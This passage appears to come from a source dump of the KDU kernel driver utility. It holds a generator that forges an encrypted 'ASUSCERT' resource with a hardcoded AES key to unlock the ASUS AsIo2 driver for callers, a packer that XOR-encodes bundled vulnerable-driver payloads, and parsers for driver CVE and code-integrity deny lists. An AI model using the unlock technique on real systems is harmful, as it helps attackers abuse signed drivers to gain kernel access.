        if (ImageBase == NULL) {
            printf_s("[G] MapViewOfFile failed for input file\n");
            __leave;
        }

        NtHeaders = RtlImageNtHeader(ImageBase);
        if (NtHeaders == NULL) {
            printf_s("[G] RtlImageNtHeader failed for input file\n");
            __leave;
        }

        oh32 = (PIMAGE_OPTIONAL_HEADER32)&NtHeaders->OptionalHeader;
        oh64 = (PIMAGE_OPTIONAL_HEADER64)oh32;

        if ((NtHeaders->FileHeader.Machine != IMAGE_FILE_MACHINE_AMD64) && (NtHeaders->FileHeader.Machine != IMAGE_FILE_MACHINE_I386)) {
            printf_s("[G] Unsuported FileHeader.Machine value\n");
            __leave;
        }

        NewCheckSum = supCalculateCheckSumForMappedFile(ImageBase, FileSize);
        if (NtHeaders->FileHeader.Machine == IMAGE_FILE_MACHINE_AMD64) {
            oh64->CheckSum = NewCheckSum;
        }
        else {
            oh32->CheckSum = NewCheckSum;
        }

        bResult = TRUE;

    }
    __finally {
        if (ImageBase) {
            FlushViewOfFile(ImageBase, 0);
            UnmapViewOfFile(ImageBase);
        }

        if (hFileMap)
            CloseHandle(hFileMap);

        if (hFile != INVALID_HANDLE_VALUE)
            CloseHandle(hFile);
    }

    return bResult;
}


VOID ProcessFile(
    _In_ LPCSTR lpFileName)
{
    BOOL bUpdated = FALSE, bInit;
    ULONG seconds = 0, dwError;
    LARGE_INTEGER fileTime;

    BYTE Buffer[16];
    DWORD aKey[4] = { 0x16157EAA, 0xA6D2AE28, 0x8815F7AB, 0x3C4FCF09 };

    HCRYPTPROV hProv;
    HCRYPTKEY hKey = NULL;
    DWORD bytesIO = 0;
    DWORD dwMode;

    struct {
        BLOBHEADER hdr;
        DWORD len;
        BYTE key[16];
    } KeyBlob;

    GetSystemTimeAsFileTime((PFILETIME)&fileTime);
    RtlTimeToSecondsSince1970(&fileTime, &seconds);

    RtlSecureZeroMemory(Buffer, sizeof(Buffer));

    RtlCopyMemory(Buffer, &seconds, sizeof(DWORD));

    do {

        bInit = CryptAcquireContext(&hProv,
            NULL,
            MS_ENH_RSA_AES_PROV,
            PROV_RSA_AES,
            CRYPT_SILENT);

        if (!bInit)
        {
            if (GetLastError() == NTE_BAD_KEYSET) {

                bInit = CryptAcquireContext(&hProv,
                    NULL,
                    MS_ENH_RSA_AES_PROV,
                    PROV_RSA_AES,
                    CRYPT_NEWKEYSET);
            }

        }

        if (bInit == FALSE) {
            printf_s("[G] Failed to acquire context for Crypto API, error %lX\n", GetLastError());
            break;
        }

        printf_s("[G] CryptoAPI context acquired\n");

        KeyBlob.hdr.bType = PLAINTEXTKEYBLOB;
        KeyBlob.hdr.bVersion = CUR_BLOB_VERSION;
        KeyBlob.hdr.reserved = 0;
        KeyBlob.hdr.aiKeyAlg = CALG_AES_128;
        KeyBlob.len = sizeof(aKey);
        RtlCopyMemory(KeyBlob.key, aKey, sizeof(aKey));

        if (!CryptImportKey(hProv, (BYTE*)&KeyBlob, sizeof(KeyBlob), NULL, 0, &hKey)) {
            printf_s("[G] Failed to import key, error %lX\n", GetLastError());
            break;
        }
        else {
            printf_s("[G] AES key imported successfully\n");
        }

        dwMode = CRYPT_MODE_ECB;

        if (!CryptSetKeyParam(hKey, KP_MODE, (BYTE*)&dwMode, 0)) {
            printf_s("[G] Failed to set key param, error %lX\n", GetLastError());
            break;
        }
        else {
            printf_s("[G] AES ECB mode set\n");
        }

        bytesIO = sizeof(Buffer);

        if (!CryptEncrypt(hKey, NULL, FALSE, 0, (BYTE*)Buffer, &bytesIO, bytesIO)) {
            printf_s("[G] Failed to encrypt data, error %lX\n", GetLastError());
            break;
        }
        else {
            printf_s("[G] Data for driver unlocking encrypted successfully\n");
        }

    } while (FALSE);

    if (hKey) CryptDestroyKey(hKey);
    CryptReleaseContext(hProv, 0);

    printf_s("[G] Generating AsIo2 unlock resource\n");

    HANDLE hRes = BeginUpdateResourceA(lpFileName, FALSE);
    if (hRes) {

        if (!UpdateResourceA(hRes,
            (LPCSTR)RT_RCDATA,
            "ASUSCERT",
            MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL),
            Buffer,
            sizeof(Buffer)))
        {
            dwError = GetLastError();
            printf_s("[G] Could not update resources, GetLastError %lu\n", dwError);
        }
        else {
            printf_s("[G] File resources updated\n");
        }

        bUpdated = EndUpdateResource(hRes, FALSE);

    }
    else {
        dwError = GetLastError();
        printf_s("[G] Could not open %s, GetLastError %lu\n", lpFileName, dwError);
    }

    if (bUpdated) {

        printf_s("[G] Updating file checksum\n");

        if (UpdateChecksum(lpFileName)) {
            printf_s("[G] Checksum updated\n");
        }
        else {
            printf_s("[G] Could not update checksum!\n");
        }
    }
}

int main()
{
    ULONG l;
    CHAR szFileName[MAX_PATH + 1];

    l = 0;
    RtlSecureZeroMemory(szFileName, sizeof(szFileName));
    GetCommandLineParamA(GetCommandLineA(), 1, szFileName, MAX_PATH, &l);
    if (l > 0) {
        printf_s("GenAsIo2Unlock v1.0 built at %s\n[G] Processing input file %s\n", __TIMESTAMP__, szFileName);
        ProcessFile(szFileName);
    }
    else {
        printf_s("[G] Input file not specified\n");
    }
    return 0;
}

```

`Source/Utils/PCOMP/PCOMP.cpp`:

```cpp
/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2020 - 2025
*
*  TITLE:       MAIN.CPP
*
*  VERSION:     1.10
*
*  DATE:        15 Dec 2025
*
*  PCOMP - KDU's Provider Compressor/Decompressor.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#include <Windows.h>
#include <msdelta.h>
#include <strsafe.h>

#pragma comment(lib, "msdelta.lib")

#ifdef __cplusplus
extern "C" {
#include "../../Shared/ntos/ntos.h"
#include "../../Shared/minirtl/minirtl.h"
#include "../../Shared/minirtl/cmdline.h"
#include "../../Shared/minirtl/_filename.h"
}
#endif

#define PROVIDER_RES_KEY_DEFAULT        ' uwu'

#define supHeapAlloc(Size) RtlAllocateHeap(NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, Size)
#define supHeapFree(Ptr) RtlFreeHeap(NtCurrentPeb()->ProcessHeap, 0, Ptr)

/*
* EncodeBuffer
*
* Purpose:
*
* Decrypt/Encrypt given buffer.
*
*/
VOID EncodeBuffer(
    _In_ PVOID Buffer,
    _In_ ULONG BufferSize,
    _In_ ULONG Key
)
{
    ULONG k, c;
    PUCHAR ptr;

    if ((Buffer == NULL) || (BufferSize == 0))
        return;

    k = Key;
    c = BufferSize;
    ptr = (PUCHAR)Buffer;

    do {
        *ptr ^= k;
        k = _rotl(k, 1);
        ptr++;
        --c;
    } while (c != 0);
}

/*
* supWriteBufferToFile
*
* Purpose:
*
* Create new file and write buffer to it.
*
*/
BOOL supWriteBufferToFile(
    _In_ LPWSTR lpFileName,
    _In_ PVOID Buffer,
    _In_ DWORD BufferSize
)
{
    HANDLE hFile;
    DWORD bytesIO;

    hFile = CreateFileW(lpFileName,
        GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);

    if (hFile == INVALID_HANDLE_VALUE) {
        return FALSE;
    }

    WriteFile(hFile, Buffer, BufferSize, &bytesIO, NULL);
    CloseHandle(hFile);

    return (bytesIO == BufferSize);
}

/*
* supReadFileToBuffer
*
* Purpose:
*
* Read file to buffer. Release memory when it no longer needed.
*
*/
PBYTE supReadFileToBuffer(
    _In_ LPWSTR lpFileName,
    _Inout_opt_ LPDWORD lpBufferSize
)
{
    NTSTATUS    status;
    HANDLE      hFile = NULL;
    PBYTE       Buffer = NULL;
    SIZE_T      sz = 0;

    UNICODE_STRING              usName;
    OBJECT_ATTRIBUTES           attr;
    IO_STATUS_BLOCK             iost;
    FILE_STANDARD_INFORMATION   fi;

    if (lpFileName == NULL)
        return NULL;

    usName.Buffer = NULL;

    do {

        if (!RtlDosPathNameToNtPathName_U(lpFileName, &usName, NULL, NULL))
            break;

        InitializeObjectAttributes(&attr, &usName, OBJ_CASE_INSENSITIVE, NULL, NULL);

        status = NtCreateFile(
            &hFile,
            FILE_READ_DATA | SYNCHRONIZE,
            &attr,
            &iost,
            NULL,
            FILE_ATTRIBUTE_NORMAL,
            FILE_SHARE_READ,
            FILE_OPEN,
            FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT,
            NULL,
            0
        );

        if (!NT_SUCCESS(status)) {
            break;
        }

        RtlSecureZeroMemory(&fi, sizeof(fi));

        status = NtQueryInformationFile(
            hFile,
            &iost,
            &fi,
            sizeof(FILE_STANDARD_INFORMATION),
            FileStandardInformation);

        if (!NT_SUCCESS(status))
            break;

        sz = (SIZE_T)fi.EndOfFile.LowPart;

        Buffer = (PBYTE)supHeapAlloc(sz);
        if (Buffer) {

            status = NtReadFile(
                hFile,
                NULL,
                NULL,
                NULL,
                &iost,
                Buffer,
                fi.EndOfFile.LowPart,
                NULL,
                NULL);

            if (NT_SUCCESS(status)) {
                if (lpBufferSize)
                    *lpBufferSize = fi.EndOfFile.LowPart;
            }
            else {
                supHeapFree(Buffer);
                Buffer = NULL;
            }
        }

    } while (FALSE);

    if (hFile != NULL) {
        NtClose(hFile);
    }

    if (usName.Buffer)
        RtlFreeUnicodeString(&usName);

    return Buffer;
}

/*
* KDUCompressResource
*
* Purpose:
*
* Compress resource and write it to the disk into new file with same name and .bin extension.
*
*/
VOID KDUCompressResource(
    _In_ LPWSTR lpFileName,
    _In_ ULONG ulCompressKey
)
{
    DWORD fileSize = 0;
    PBYTE fileBuffer;

    DELTA_INPUT d_in, d_target, s_op, t_op, g_op;
    DELTA_OUTPUT d_out;

    printf_s("[+] Compress key used 0x%lx\r\n", ulCompressKey);
    printf_s("[+] Reading \"%wS\"\r\n", lpFileName);
    fileBuffer = supReadFileToBuffer(lpFileName, &fileSize);

    if (fileBuffer) {

        printf_s("[+] %lu bytes read\r\n", fileSize);

        PWSTR newFileName;
        SIZE_T sz = _strlen(lpFileName) + (2 * MAX_PATH);

        newFileName = (PWSTR)supHeapAlloc(sz);
        if (newFileName == NULL) {

            printf_s("[!] Could not allocate memory for filename, GetLastError %lu\r\n",
                GetLastError());

        }
        else {

            _filename_noext(newFileName, lpFileName);

            RtlSecureZeroMemory(&d_in, sizeof(DELTA_INPUT));
            d_target.lpcStart = fileBuffer;
            d_target.uSize = fileSize;
            d_target.Editable = FALSE;

            RtlSecureZeroMemory(&s_op, sizeof(DELTA_INPUT));
            RtlSecureZeroMemory(&t_op, sizeof(DELTA_INPUT));
            RtlSecureZeroMemory(&g_op, sizeof(DELTA_INPUT));

            if (CreateDeltaB(DELTA_FILE_TYPE_RAW,
                DELTA_FLAG_NONE,
                DELTA_FLAG_NONE,
                d_in,
                d_target,
                s_op,
                t_op,
                g_op,
                NULL,
                0,
                &d_out))
            {
                SIZE_T writeSize = d_out.uSize;
                PVOID dataBlob = supHeapAlloc(writeSize);
                if (dataBlob) {

                    RtlCopyMemory(dataBlob, d_out.lpStart, writeSize);
                    EncodeBuffer(dataBlob, (ULONG)writeSize, ulCompressKey);

                    _strcat(newFileName, L".bin");

                    printf_s("[+] Saving resource as \"%wS\" with new size %llu bytes\r\n",
                        newFileName,
                        writeSize);

                    if (!supWriteBufferToFile(newFileName,
                        dataBlob,
                        (DWORD)writeSize))
                    {

                        printf_s("[!] Error writing to file \"%wS\", GetLastError %lu\r\n",
                            newFileName,
                            GetLastError());

                    }

                    supHeapFree(dataBlob);
                }

                DeltaFree(d_out.lpStart);
            }
            else {

                printf_s("[!] Error compressing resource, GetLastError %lu\r\n", GetLastError());

            }

            supHeapFree(newFileName);
        }

        supHeapFree(fileBuffer);

    }
    else {

        printf_s("[!] Could not read input file \"%wS\"\r\n", lpFileName);

    }

}

/*
* KDUDecompressResourceRaw
*
* Purpose:
*
* Decompress resource and return pointer to decompressed data.
*
* N.B. Use supHeapFree to release memory allocated for the decompressed buffer.
*
*/
PVOID KDUDecompressResourceRaw(
    _In_ PVOID ResourcePtr,
    _In_ SIZE_T ResourceSize,
    _Out_ PSIZE_T DecompressedSize,
    _In_ ULONG DecryptKey
)
{
    DELTA_INPUT diDelta, diSource;
    DELTA_OUTPUT doOutput;
    PVOID resultPtr = NULL, dataBlob;

    SIZE_T newSize = 0;
    PVOID decomPtr = NULL;

    *DecompressedSize = 0;

    RtlSecureZeroMemory(&diSource, sizeof(DELTA_INPUT));
    RtlSecureZeroMemory(&diDelta, sizeof(DELTA_INPUT));
    RtlSecureZeroMemory(&doOutput, sizeof(DELTA_OUTPUT));

    dataBlob = supHeapAlloc(ResourceSize);
    if (dataBlob) {
        RtlCopyMemory(dataBlob, ResourcePtr, ResourceSize);
        EncodeBuffer(dataBlob, (ULONG)ResourceSize, DecryptKey);

        diDelta.Editable = FALSE;
        diDelta.lpcStart = dataBlob;
        diDelta.uSize = ResourceSize;

        if (ApplyDeltaB(DELTA_FILE_TYPE_RAW, diSource, diDelta, &doOutput)) {
            newSize = doOutput.uSize;
            decomPtr = doOutput.lpStart;
            resultPtr = (PVOID)supHeapAlloc(newSize);
            if (resultPtr) {
                RtlCopyMemory(resultPtr, decomPtr, newSize);
                *DecompressedSize = newSize;
            }
            DeltaFree(doOutput.lpStart);
        }
        else {
            printf_s("[!] Error while decompressing resource, GetLastError %lu\r\n", GetLastError());
        }
        supHeapFree(dataBlob);
    }

    return resultPtr;
}

/*
* KDUDecompressFile
*
* Purpose:
*
* Decrypt+decompress file produced by KDUCompressResource and write output to disk.
*
*/
VOID KDUDecompressFile(
    _In_ LPWSTR lpFileName,
    _In_ ULONG ulDecryptKey
)
{
    DWORD fileSize = 0;
    PBYTE fileBuffer;

    PVOID decompressedBuffer = NULL;
    SIZE_T decompressedSize = 0;

    PWSTR newFileName;
    SIZE_T sz;

    printf_s("[+] Decompress key used 0x%lx\r\n", ulDecryptKey);
    printf_s("[+] Reading \"%wS\"\r\n", lpFileName);

    fileBuffer = supReadFileToBuffer(lpFileName, &fileSize);
    if (fileBuffer == NULL) {
        printf_s("[!] Could not read input file \"%wS\"\r\n", lpFileName);
        return;
    }

    printf_s("[+] %lu bytes read\r\n", fileSize);

    decompressedBuffer = KDUDecompressResourceRaw(fileBuffer,
        (SIZE_T)fileSize,
        &decompressedSize,
        ulDecryptKey);

    if (decompressedBuffer == NULL) {
        printf_s("[!] Decompression failed\r\n");
        supHeapFree(fileBuffer);
        return;
    }

    sz = _strlen(lpFileName) + (2 * MAX_PATH);

    newFileName = (PWSTR)supHeapAlloc(sz);
    if (newFileName == NULL) {

        printf_s("[!] Could not allocate memory for filename, GetLastError %lu\r\n",
            GetLastError());

    }
    else {

        _filename_noext(newFileName, lpFileName);
        _strcat(newFileName, L".decompressed");

        printf_s("[+] Saving decompressed data as \"%wS\" with new size %llu bytes\r\n",
            newFileName,
            decompressedSize);

        if (!supWriteBufferToFile(newFileName,
            decompressedBuffer,
            (DWORD)decompressedSize))
        {

            printf_s("[!] Error writing to file \"%wS\", GetLastError %lu\r\n",
                newFileName,
                GetLastError());

        }

        supHeapFree(newFileName);
    }

    supHeapFree(decompressedBuffer);
    supHeapFree(fileBuffer);
}

/*
* main
*
* Purpose:
*
* Program entrypoint.
*
*/
int main()
{
    LPWSTR  keyParam = NULL, fNameParam = NULL;
    LPWSTR* szArglist;
    INT     nArgs = 0;

    ULONG provKey = 0;

    szArglist = CommandLineToArgvW(GetCommandLineW(), &nArgs);
    if (szArglist) {

        if (nArgs > 1) {

            if (_strcmpi(szArglist[1], L"-d") == 0 || _strcmpi(szArglist[1], L"/d") == 0) {
                if (nArgs > 2) {
                    fNameParam = szArglist[2];
                    if (nArgs > 3)
                        keyParam = szArglist[3];

                    if (keyParam)
                        provKey = _strtoul(keyParam);

                    if (provKey == 0)
                        provKey = PROVIDER_RES_KEY_DEFAULT;

                    if (fNameParam) {
                        KDUDecompressFile(fNameParam, provKey);
                    }
                    else {
                        printf_s("[!] Unrecognized parameter\r\n");
                    }
                }
                else {
                    printf_s("[?] KDU Provider Compressor, usage: pcomp -d filename.bin [key]\r\n[!] Input file not specified\r\n");
                }
            }
            else {
                fNameParam = szArglist[1];
                if (nArgs > 2)
                    keyParam = szArglist[2];

                if (keyParam)
                    provKey = _strtoul(keyParam);

                if (provKey == 0)
                    provKey = PROVIDER_RES_KEY_DEFAULT;

                if (fNameParam) {
                    KDUCompressResource(fNameParam, provKey);
                }
                else {
                    printf_s("[!] Unrecognized parameter\r\n");
                }
            }
        }
        else {
            printf_s("[?] KDU Provider Compressor, usage: pcomp filename [key]\r\n[!] Input file not specified\r\n");
        }

        LocalFree(szArglist);
    }

    ExitProcess(0);
}

```

`Source/Utils/PCOMP/PCOMP.sln`:

```sln

Microsoft Visual Studio Solution File, Format Version 12.00
# Visual Studio Version 16
VisualStudioVersion = 16.0.31025.218
MinimumVisualStudioVersion = 10.0.40219.1
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "PCOMP", "PCOMP.vcxproj", "{24663340-6C3F-479E-94C0-C2A847B1665C}"
EndProject
Global
	GlobalSection(SolutionConfigurationPlatforms) = preSolution
		Debug|x64 = Debug|x64
		Release|x64 = Release|x64
	EndGlobalSection
	GlobalSection(ProjectConfigurationPlatforms) = postSolution
		{24663340-6C3F-479E-94C0-C2A847B1665C}.Debug|x64.ActiveCfg = Debug|x64
		{24663340-6C3F-479E-94C0-C2A847B1665C}.Debug|x64.Build.0 = Debug|x64
		{24663340-6C3F-479E-94C0-C2A847B1665C}.Release|x64.ActiveCfg = Release|x64
		{24663340-6C3F-479E-94C0-C2A847B1665C}.Release|x64.Build.0 = Release|x64
	EndGlobalSection
	GlobalSection(SolutionProperties) = preSolution
		HideSolutionNode = FALSE
	EndGlobalSection
	GlobalSection(ExtensibilityGlobals) = postSolution
		SolutionGuid = {71E5E6C3-C15C-48C9-83F4-A709C7851F13}
	EndGlobalSection
EndGlobal

```

`Source/Utils/PCOMP/PCOMP.vcxproj`:

```vcxproj
<?xml version="1.0" encoding="utf-8"?>
<Project DefaultTargets="Build" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup Label="ProjectConfigurations">
    <ProjectConfiguration Include="Debug|x64">
      <Configuration>Debug</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|x64">
      <Configuration>Release</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
  </ItemGroup>
  <PropertyGroup Label="Globals">
    <VCProjectVersion>16.0</VCProjectVersion>
    <Keyword>Win32Proj</Keyword>
    <ProjectGuid>{24663340-6c3f-479e-94c0-c2a847b1665c}</ProjectGuid>
    <RootNamespace>PCOMP</RootNamespace>
    <WindowsTargetPlatformVersion>10.0</WindowsTargetPlatformVersion>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v145</PlatformToolset>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v145</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
  <ImportGroup Label="ExtensionSettings">
  </ImportGroup>
  <ImportGroup Label="Shared">
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <PropertyGroup Label="UserMacros" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <LinkIncremental>true</LinkIncremental>
    <OutDir>.\output\$(Platform)\$(Configuration)\</OutDir>
    <IntDir>.\output\$(Platform)\$(Configuration)\</IntDir>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <LinkIncremental>false</LinkIncremental>
    <OutDir>.\output\$(Platform)\$(Configuration)\</OutDir>
    <IntDir>.\output\$(Platform)\$(Configuration)\</IntDir>
  </PropertyGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <ClCompile>
      <WarningLevel>Level4</WarningLevel>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>_DEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <ClCompile>
      <WarningLevel>Level4</WarningLevel>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>NDEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
      <RuntimeLibrary>MultiThreaded</RuntimeLibrary>
      <AdditionalOptions> %(AdditionalOptions)</AdditionalOptions>
      <StringPooling>true</StringPooling>
      <ExceptionHandling>false</ExceptionHandling>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
      <GenerateDebugInformation>false</GenerateDebugInformation>
      <AdditionalOptions>/NOCOFFGRPINFO %(AdditionalOptions)</AdditionalOptions>
    </Link>
  </ItemDefinitionGroup>
  <ItemGroup>
    <ClCompile Include="..\..\Shared\minirtl\strtoul.c" />
    <ClCompile Include="..\..\Shared\minirtl\_filename.c" />
    <ClCompile Include="..\..\Shared\minirtl\_strcat.c" />
    <ClCompile Include="..\..\Shared\minirtl\_strcmpi.c" />
    <ClCompile Include="..\..\Shared\minirtl\_strend.c" />
    <ClCompile Include="..\..\Shared\minirtl\_strlen.c" />
    <ClCompile Include="PCOMP.cpp" />
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="..\..\Shared\minirtl\minirtl.h" />
    <ClInclude Include="..\..\Shared\minirtl\rtltypes.h" />
  </ItemGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
  <ImportGroup Label="ExtensionTargets">
  </ImportGroup>
</Project>
```

`Source/Utils/PCOMP/PCOMP.vcxproj.filters`:

```filters
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup>
    <Filter Include="Source Files">
      <UniqueIdentifier>{4FC737F1-C7A5-4376-A066-2A32D752A2FF}</UniqueIdentifier>
      <Extensions>cpp;c;cc;cxx;c++;cppm;ixx;def;odl;idl;hpj;bat;asm;asmx</Extensions>
    </Filter>
    <Filter Include="Header Files">
      <UniqueIdentifier>{93995380-89BD-4b04-88EB-625FBE52EBFB}</UniqueIdentifier>
      <Extensions>h;hh;hpp;hxx;h++;hm;inl;inc;ipp;xsd</Extensions>
    </Filter>
    <Filter Include="Resource Files">
      <UniqueIdentifier>{67DA6AB6-F800-4c08-8B7A-83BB121AAD01}</UniqueIdentifier>
      <Extensions>rc;ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe;resx;tiff;tif;png;wav;mfcribbon-ms</Extensions>
    </Filter>
    <Filter Include="minirtl">
      <UniqueIdentifier>{5db9469b-bbf6-4ca5-9982-03ea315e20c6}</UniqueIdentifier>
    </Filter>
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="PCOMP.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="..\..\Shared\minirtl\strtoul.c">
      <Filter>minirtl</Filter>
    </ClCompile>
    <ClCompile Include="..\..\Shared\minirtl\_strlen.c">
      <Filter>minirtl</Filter>
    </ClCompile>
    <ClCompile Include="..\..\Shared\minirtl\_strcat.c">
      <Filter>minirtl</Filter>
    </ClCompile>
    <ClCompile Include="..\..\Shared\minirtl\_filename.c">
      <Filter>minirtl</Filter>
    </ClCompile>
    <ClCompile Include="..\..\Shared\minirtl\_strend.c">
      <Filter>minirtl</Filter>
    </ClCompile>
    <ClCompile Include="..\..\Shared\minirtl\_strcmpi.c">
      <Filter>minirtl</Filter>
    </ClCompile>
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="..\..\Shared\minirtl\minirtl.h">
      <Filter>minirtl</Filter>
    </ClInclude>
    <ClInclude Include="..\..\Shared\minirtl\rtltypes.h">
      <Filter>minirtl</Filter>
    </ClInclude>
  </ItemGroup>
</Project>
```

`Source/Utils/PCOMP/PCOMP.vcxproj.user`:

```user
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="Current" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <LocalDebuggerCommandArguments>
    </LocalDebuggerCommandArguments>
    <DebuggerFlavor>WindowsLocalDebugger</DebuggerFlavor>
  </PropertyGroup>
</Project>
```

`Source/Utils/SiPolicyChecker/CProviders.cs`:

```cs
/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2024 - 2025
*
*  TITLE:       CPROVIDERS.CS
*
*  VERSION:     1.00
*
*  DATE:        14 Jun 2025
*
*  KDU providers classes layout for XML (de)serialization.
* 
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/
using System.Xml.Serialization;

[XmlRoot("Drivers")]
public class CProviders
{
    [XmlElement("Driver")]
    public List<Driver>? Drivers { get; set; }
}

public class Driver
{
    [XmlElement("Id")]
    public int? Id { get; set; }

    [XmlElement("Codebase")]
    public string? Codebase { get; set; }

    [XmlElement("CVEs")]
    public string? CVEs { get; set; }

    [XmlElement("Hashes")]
    public Hashes? Hashes { get; set; }
}

public class Hashes
{
    [XmlElement("FileSHA1")]
    public string? FileSHA1 { get; set; }

    [XmlElement("AuthenticodeSHA1")]
    public string? AuthenticodeSHA1 { get; set; }

    [XmlElement("PageSHA1")]
    public string? PageSHA1 { get; set; }

    [XmlElement("PageSHA256")]
    public string? PageSHA256 { get; set; }
}

```

`Source/Utils/SiPolicyChecker/CSiPolicy.cs`:

```cs
/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2024 - 2025
*
*  TITLE:       CSIPOLICY.CS
*
*  VERSION:     1.00
*
*  DATE:        14 Jun 2025
*
*  SiPolicy classes layout for XML (de)serialization.
* 
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/
using System.Xml.Serialization;

[XmlRoot(ElementName = "Rule", Namespace = "urn:schemas-microsoft-com:sipolicy")]
public class Rule
{
    [XmlElement(ElementName = "Option", Namespace = "urn:schemas-microsoft-com:sipolicy")]
    public string? Option { get; set; }
}

[XmlRoot(ElementName = "Rules", Namespace = "urn:schemas-microsoft-com:sipolicy")]
public class Rules
{
    [XmlElement(ElementName = "Rule", Namespace = "urn:schemas-microsoft-com:sipolicy")]
    public List<Rule>? Rule { get; set; }
}

[XmlRoot(ElementName = "Allow", Namespace = "urn:schemas-microsoft-com:sipolicy")]
public class Allow
{
    [XmlAttribute(AttributeName = "ID")]
    public string? ID { get; set; }
    [XmlAttribute(AttributeName = "FriendlyName")]
    public string? FriendlyName { get; set; }
    [XmlAttribute(AttributeName = "FileName")]
    public string? FileName { get; set; }
}

[XmlRoot(ElementName = "Deny", Namespace = "urn:schemas-microsoft-com:sipolicy")]
public class Deny
{
    [XmlAttribute(AttributeName = "ID")]
    public string? ID { get; set; }
    [XmlAttribute(AttributeName = "FriendlyName")]
    public string? FriendlyName { get; set; }
    [XmlAttribute(AttributeName = "Hash")]
    public string? Hash { get; set; }
    [XmlAttribute(AttributeName = "FileName")]
    public string? FileName { get; set; }
    [XmlAttribute(AttributeName = "MinimumFileVersion")]
    public string? MinimumFileVersion { get; set; }
    [XmlAttribute(AttributeName = "MaximumFileVersion")]
    public string? MaximumFileVersion { get; set; }
}

[XmlRoot(ElementName = "FileAttrib", Namespace = "urn:schemas-microsoft-com:sipolicy")]
public class FileAttrib
{
    [XmlAttribute(AttributeName = "ID")]
    public string? ID { get; set; }
    [XmlAttribute(AttributeName = "FriendlyName")]
    public string? FriendlyName { get; set; }
